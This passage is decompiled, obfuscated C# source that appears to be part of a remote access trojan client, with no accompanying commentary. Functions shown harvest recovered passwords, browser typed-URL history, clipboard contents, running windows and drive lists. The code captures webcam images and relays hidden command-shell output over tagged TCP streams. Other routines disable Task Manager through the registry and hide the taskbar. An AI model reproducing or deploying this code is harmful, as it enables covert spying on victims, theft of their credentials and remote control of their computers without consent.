		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ServiceController[] services = ServiceController.GetServices();
			ServiceController[] array = services;
			foreach (ServiceController val in array)
			{
				string text2 = val.get_DisplayName() + "*";
				text2 = text2 + ((Enum)val.get_Status()).ToString() + "*";
				DViQSZoLzIUbQjlcdrIp8hak48 dViQSZoLzIUbQjlcdrIp8hak = new DViQSZoLzIUbQjlcdrIp8hak48(val.get_ServiceName());
				text2 += dViQSZoLzIUbQjlcdrIp8hak.StartupType;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void reTzimqVbb119(object Tempdata)
	{
		try
		{
			if (((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().FileExists(Conversions.ToString(Tempdata)))
			{
				((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Tempdata));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void W48ok1bqoN120(object Tempdata)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¼" }, (string[])null, (Type[])null, (bool[])null);
			string text = Conversions.ToString(NewLateBinding.LateGet(array.GetValue(1), (Type)null, "Replace", new object[2] { "±", "\r\n" }, (string[])null, (Type[])null, (bool[])null));
			int num = int.Parse(Conversions.ToString(array.GetValue(0)));
			MzJp2MishF2k4tNrI0R8Hwx247 mzJp2MishF2k4tNrI0R8Hwx = new MzJp2MishF2k4tNrI0R8Hwx247(text);
			mzJp2MishF2k4tNrI0R8Hwx.Font = new Font("Tahoma", (float)num);
			((PrintDocument)mzJp2MishF2k4tNrI0R8Hwx).Print();
			array = null;
			Tempdata = null;
			num = 0;
			((Component)(object)mzJp2MishF2k4tNrI0R8Hwx).Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string J4inBDVzcV121()
	{
		try
		{
			string text = null;
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text2 in array)
			{
				text = text + "*" + text2;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void uqpHzbxjkt122(int DelayInSeconds)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(DelayInSeconds);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private long nWRCcpvhl6123(string FileName)
	{
		long length = default(long);
		try
		{
			FileInfo fileInfo = new FileInfo(FileName);
			length = fileInfo.Length;
			return length;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return length;
		}
	}

	private void method_2()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (!IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void rRJfGwErO8125()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void uR5UqMcGac126()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void g0mF1wdBVG128()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void K3tdBcK0QB129()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_4()
	{
		try
		{
			try
			{
				JJZ33lEpUnad32.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				VxHEEbFtIY3B31.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				L7lFgASOP4LW30.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				Tryrp8M3qDof29.Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_0.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				NFCnrPosVzmA1p38103.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				bS71wo0VkEExizhtJOVX153.Close();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				rtsjTeTgv68.Close();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				KyK1HQRAP78.Close();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				gRD2hdi1YTNjXHDW93.Close();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_2.Close();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				aAu7s6NCxj2IxRAt83.Close();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				ZSVTBSW5G7UlH123.Close();
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				mfRWvmrHi8wh2Klh88.Close();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				rXBeNbP8JaKg1e282DlZ143.Close();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				UrXmHDk158.Close();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				UrXmHDk158.Close();
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				ckmFD5aTnR3097QpXnb7128.Close();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				NJpL1Ycp1npDu113.Close();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				TPm01kas9Ftr684eVBAw133.Close();
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				K1JJqeuHlGpEOGWT108.Close();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				i0wwQ8ofQWUnTFBEmOsT148.Close();
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				tCWcxwXR3WqONce6P3EM138.Close();
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				CfpoKfEclpg9P118.Close();
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_1.Close();
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				bool_1 = true;
				QIGwaut166 = false;
				iHoXiV2167 = false;
				jjJf521 = null;
				string_0 = "Disconnect";
				SendMessageA(VYNpq44FWoh854, 1035, 0, 0);
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				OCk5jd1kb72.Abort();
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
			try
			{
				PdXX8KEu277.Abort();
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
			try
			{
				LRezQfqMoKSkslkL82.Abort();
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
			try
			{
				GIeuxSQkzNvoVRUj87.Abort();
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
			try
			{
				ScPffhmZevdYxAVZ92.Abort();
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
			try
			{
				O6Dz1OeFyRfULdGO97.Abort();
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_0.Abort();
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
			try
			{
				ZwPbsInkmpFxy1LO107.Abort();
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
			try
			{
				SS0oqgyjoYwkq112.Abort();
			}
			catch (Exception projectError35)
			{
				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
			try
			{
				TyjNpWTGtJAzA117.Abort();
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
			try
			{
				t7QJpDjqPM8xM122.Abort();
			}
			catch (Exception projectError37)
			{
				ProjectData.SetProjectError(projectError37);
				ProjectData.ClearProjectError();
			}
			try
			{
				lFucIREuZGc4z127.Abort();
			}
			catch (Exception projectError38)
			{
				ProjectData.SetProjectError(projectError38);
				ProjectData.ClearProjectError();
			}
			try
			{
				v3IAn10LHT4OrFkFB0fp132.Abort();
			}
			catch (Exception projectError39)
			{
				ProjectData.SetProjectError(projectError39);
				ProjectData.ClearProjectError();
			}
			try
			{
				xXS9nrYyApSOpNZ9lzOj137.Abort();
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
			try
			{
				KAFFbQr9yKM0ZP8MNXOU142.Abort();
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_1.Abort();
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
			try
			{
				CN33Ju644revJUlRqHp4152.Abort();
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_2.Abort();
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
			GC.Collect();
		}
		catch (Exception projectError45)
		{
			ProjectData.SetProjectError(projectError45);
			ProjectData.ClearProjectError();
		}
	}

	private void JJZ33lEpUnad32_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(e.Data))
			{
				stringBuilder.Append("/CMDCMDGO/");
				stringBuilder.Append(e.Data);
				if (!(e.Data!.StartsWith("Microsoft") | e.Data!.StartsWith("(C)") | e.Data!.StartsWith("Copyright")))
				{
					tbKpNHc155.WriteLine((object?)stringBuilder);
					tbKpNHc155.Flush();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void zAKus4a0uF132()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form val = new Form();
			val.set_TopMost(true);
			MessageBox.Show((IWin32Window)(object)val, sJH7eUGPcLHV49, cF1R1JAmmPWk50, m8O05B7e9NyW48, qpubmg0bvD3347);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string VuiI20EA7d133()
	{
		try
		{
			string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string text = null;
			int num = 1;
			while (true)
			{
				string name2 = "url" + num;
				string text2 = (string)registryKey.GetValue(name2);
				if (text2 == null)
				{
					break;
				}
				text = text + "*" + text2;
				num = checked(num + 1);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
	private static extern void mciSendStringA_1(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void RjtEC8J6wdpySPUiF135()
	{
		try
		{
			mciSendStringA_1("set CDAudio door open", UmGbfW2rg65, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_5()
	{
		try
		{
			mciSendStringA_1("set CDAudio door closed", UmGbfW2rg65, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private int MhEygruO81wisiM0s137(ref ozvy9HIEbTbWk1GKtTouTlbU45 dm)
	{
		return W3bF15llXMLuaRJ4n138(ref dm, -1);
	}

	private int W3bF15llXMLuaRJ4n138(ref ozvy9HIEbTbWk1GKtTouTlbU45 dm, int iModeNum)
	{
		return OvpK5C2ZqWPvhsxHnchuOLdW46.EnumDisplaySettings(null, iModeNum, ref dm);
	}

	private void method_6(ozvy9HIEbTbWk1GKtTouTlbU45 dm)
	{
		OvpK5C2ZqWPvhsxHnchuOLdW46.ChangeDisplaySettings(ref dm, 0);
	}

	private void oCiOKcjciFJjY9Md5140(bool enable)
	{
		try
		{
			if (Conversions.ToDouble(yQZH2MlCQxJC51) < 6.0)
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", RuntimeHelpers.GetObjectValue(Interaction.IIf(enable, (object)0, (object)1)), RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	private void s7MyhqkTrR9HI3PL6142(bool start)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (start)
			{
				kwb9lsfLyuBNAKOzUv3npGlh44.SendMessage((IntPtr)desktopWindow, 274u, (IntPtr)61760, (IntPtr)0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void O1dyb6YapkAQxX9pI143(object swpass)
	{
		try
		{
			QgC2uUC6fwwZxChSLm3NbGFF49 qgC2uUC6fwwZxChSLm3NbGFF = new QgC2uUC6fwwZxChSLm3NbGFF49();
			string text = qgC2uUC6fwwZxChSLm3NbGFF.fI3fH3qKlEX225();
			string text2 = qgC2uUC6fwwZxChSLm3NbGFF.yqV9lLbcbAn237();
			string text3 = qgC2uUC6fwwZxChSLm3NbGFF.TA3z4yflcPg226();
			string text4 = qgC2uUC6fwwZxChSLm3NbGFF.TvkcSXGwksP229();
			string text5 = qgC2uUC6fwwZxChSLm3NbGFF.IRGZ0d8RndE233();
			string text6 = qgC2uUC6fwwZxChSLm3NbGFF.w1gYi5WqFBU234();
			string text7 = qgC2uUC6fwwZxChSLm3NbGFF.YjcNWytwvwm230();
			string text8 = qgC2uUC6fwwZxChSLm3NbGFF.r5gQveqgmU7235();
			string text9 = qgC2uUC6fwwZxChSLm3NbGFF.ulmURKSwZxj236();
			string text10 = qgC2uUC6fwwZxChSLm3NbGFF.NqAJ9HTr7QK238();
			string text11 = qgC2uUC6fwwZxChSLm3NbGFF.erdirBwlKX0BnmhF6NVjNlFA217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			NewLateBinding.LateCall(swpass, (Type)null, "WriteLine", new object[1] { "/PSWRECOV/" + v6pJR2A5qz112(Conversions.ToString(obj), "&%#@?,:*") }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swpass, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool GFrwXJ2sLEaWCPUAE144(string name)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (0 < processes.Length)
			{
				Process process = processes[num];
				int num2 = default(int);
				if (process.ProcessName.StartsWith(name))
				{
					num2 = checked(num2 + 1);
				}
				if (num2 == 0)
				{
					return false;
				}
				return true;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private int TyGHh1OoS6K2TUZhZ145(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void m9kARib6prOdMvGgS146()
	{
		try
		{
			Vz2fN19 = ((Computer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Clipboard().GetText();
			Vz2fN19 = Vz2fN19.Replace("\r\n", "***");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object Tempdata)
	{
		while (true)
		{
			try
			{
				if (Operators.CompareString(ZSbMq20, "Connect", false) == 0)
				{
					string lpszWindowName = Conversions.ToString(Tempdata);
					VYNpq44FWoh854 = capCreateCaptureWindowA(ref lpszWindowName, 0, 0, 0, 320, 240, KF80W18, 0);
					SendMessageA(VYNpq44FWoh854, 1034, 0, 0);
					ZSbMq20 = "";
				}
				else if (Operators.CompareString(jjJf521, "Image", false) == 0 && QIGwaut166)
				{
					BxTa9Vs165 = jjJf521;
					jjJf521 = "";
					SendMessageA(VYNpq44FWoh854, 1084, 0, 0);
					SendMessageA(VYNpq44FWoh854, 1054, 0, 0);
					Thread thread = new Thread(sKf41guARAZb5B4M0148);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
					thread.Join();
				}
				else if (Operators.CompareString(jjJf521, "Capture", false) == 0 && iHoXiV2167)
				{
					BxTa9Vs165 = jjJf521;
					SendMessageA(VYNpq44FWoh854, 1084, 0, 0);
					SendMessageA(VYNpq44FWoh854, 1054, 0, 0);
					Thread thread2 = new Thread(sKf41guARAZb5B4M0148);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					thread2.Join();
				}
				else if (Operators.CompareString(jjJf521, "Capture2", false) == 0 && iHoXiV2167)
				{
					BxTa9Vs165 = jjJf521;
					SendMessageA(VYNpq44FWoh854, 1084, 0, 0);
					SendMessageA(VYNpq44FWoh854, 1054, 0, 0);
					Thread thread3 = new Thread(sKf41guARAZb5B4M0148);
					thread3.SetApartmentState(ApartmentState.STA);
					thread3.Start();
					thread3.Join();
				}
				else if (Operators.CompareString(string_0, "Disconnect", false) == 0)
				{
					SendMessageA(VYNpq44FWoh854, 1035, 0, 0);
					string_0 = "";
					break;
				}
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(50);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void sKf41guARAZb5B4M0148()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string text = null;
		checked
		{
			try
			{
				MYo9XmTF255 = Clipboard.GetDataObject();
				z7MzVpFX656 = (Image)(Bitmap)MYo9XmTF255.GetData(DataFormats.Bitmap);
				MemoryStream memoryStream = new MemoryStream();
				Bitmap val = new Bitmap(320, 240, (PixelFormat)135173);
				if (Operators.CompareString(BxTa9Vs165, "Capture", false) == 0)
				{
					z7MzVpFX656.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else if (z7MzVpFX656.get_Width() > 320)
				{
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.set_InterpolationMode((InterpolationMode)7);
					val2.set_CompositingQuality((CompositingQuality)2);
					val2.DrawImage(z7MzVpFX656, 0, 0, 320, 240);
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else
				{
					z7MzVpFX656.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				memoryStream.Capacity = (int)memoryStream.Length;
				byte[] buffer = memoryStream.GetBuffer();
				text = Convert.ToBase64String(buffer);
				z7MzVpFX656.Dispose();
				m2S1q17 = (int)memoryStream.Length;
				memoryStream.Flush();
				memoryStream.Dispose();
				memoryStream.Close();
				buffer = null;
				try
				{
					string bxTa9Vs = BxTa9Vs165;
					if (Operators.CompareString(bxTa9Vs, "Image", false) == 0)
					{
						qvUqHLPez75.WriteLine("/WEBIMAGE/" + text);
						qvUqHLPez75.Flush();
					}
					else
					{
						qvUqHLPez75.WriteLine("/WEBCAPTR/" + text);
						qvUqHLPez75.Flush();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					bool_1 = true;
					ProjectData.ClearProjectError();
					return;
				}
				text = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string bxTa9Vs2 = BxTa9Vs165;
					if (Operators.CompareString(bxTa9Vs2, "Image", false) == 0)
					{
						qvUqHLPez75.WriteLine("/WEBIMAGE/" + text);
						qvUqHLPez75.Flush();
					}
					else
					{
						qvUqHLPez75.WriteLine("/WEBCAPTR/" + text);
						qvUqHLPez75.Flush();
					}
					text = null;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					bool_1 = true;
					ProjectData.ClearProjectError();
					return;
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void QpyYXvHrMFTHxGEy9149()
	{
		try
		{
			if (Operators.CompareString(Vz2fN19, (string)null, false) == 0)
			{
				((Computer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Clipboard().Clear();
			}
			else
			{
				((Computer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Clipboard().SetText(Vz2fN19, (TextDataFormat)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8()
	{
		try
		{
			Process process = new Process();
			string text = null;
			string text2 = null;
			string text3 = null;
			Process[] processes = Process.GetProcesses(".");
			for (int i = 0; i < processes.Length; i = checked(i + 1))
			{
				process = processes[i];
				if (process.MainWindowTitle.Length > 0)
				{
					text = text + process.MainWindowTitle.ToString() + "²";
					text2 = text2 + process.Id + "³";
					text3 = text + "±" + text2;
				}
			}
			streamWriter_0.WriteLine("/REFRWIND/" + text3);
			streamWriter_0.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void TK6FufxCeABTjTkCW151()
	{
		List<Rectangle> list = list_0;
		Rectangle item = new Rectangle(0, 0, wNlYuvH169, Hb89l6T170);
		list.Add(item);
		List<Rectangle> list2 = list_0;
		checked
		{
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0), 0, wNlYuvH169, Hb89l6T170);
			list2.Add(item);
			List<Rectangle> list3 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 1)), 0, wNlYuvH169, Hb89l6T170);
			list3.Add(item);
			List<Rectangle> list4 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 2)), 0, wNlYuvH169, Hb89l6T170);
			list4.Add(item);
			List<Rectangle> list5 = list_0;
			item = new Rectangle(0, (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0), wNlYuvH169, Hb89l6T170);
			list5.Add(item);
			List<Rectangle> list6 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0), wNlYuvH169, Hb89l6T170);
			list6.Add(item);
			List<Rectangle> list7 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 1)), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0), wNlYuvH169, Hb89l6T170);
			list7.Add(item);
			List<Rectangle> list8 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 2)), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0), wNlYuvH169, Hb89l6T170);
			list8.Add(item);
			List<Rectangle> list9 = list_0;
			item = new Rectangle(0, (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 1)), wNlYuvH169, Hb89l6T170);
			list9.Add(item);
			List<Rectangle> list10 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 1)), wNlYuvH169, Hb89l6T170);
			list10.Add(item);
			List<Rectangle> list11 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 1)), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 1)), wNlYuvH169, Hb89l6T170);
			list11.Add(item);
			List<Rectangle> list12 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0 + (double)(wNlYuvH169 * 2)), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 1)), wNlYuvH169, Hb89l6T170);
			list12.Add(item);
			List<Rectangle> list13 = list_0;
			item = new Rectangle(0, (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 2)), wNlYuvH169, Hb89l6T170);
			list13.Add(item);
			List<Rectangle> list14 = list_0;
			item = new Rectangle((int)Math.Round((double)AgdpdbADNmzn53.Width / 4.0), (int)Math.Round((double)AgdpdbADNmzn53.Height / 4.0 + (double)(Hb89l6T170 * 2)), wNlYuvH169, Hb89l6T170);
			list14.Add(item);
			List<Rectangle> list15 = list_0;
